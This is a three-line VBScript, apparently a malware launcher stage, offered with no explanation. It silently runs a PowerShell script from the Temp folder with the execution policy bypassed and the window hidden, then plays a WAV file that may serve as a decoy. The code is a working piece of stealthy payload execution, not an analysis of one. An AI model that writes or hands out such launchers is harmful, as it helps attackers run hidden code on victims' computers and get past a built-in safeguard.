Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -Ep Bypass %Temp%\script.ps1", 0, false
WshShell.Run "Naruto.wav", 0, false
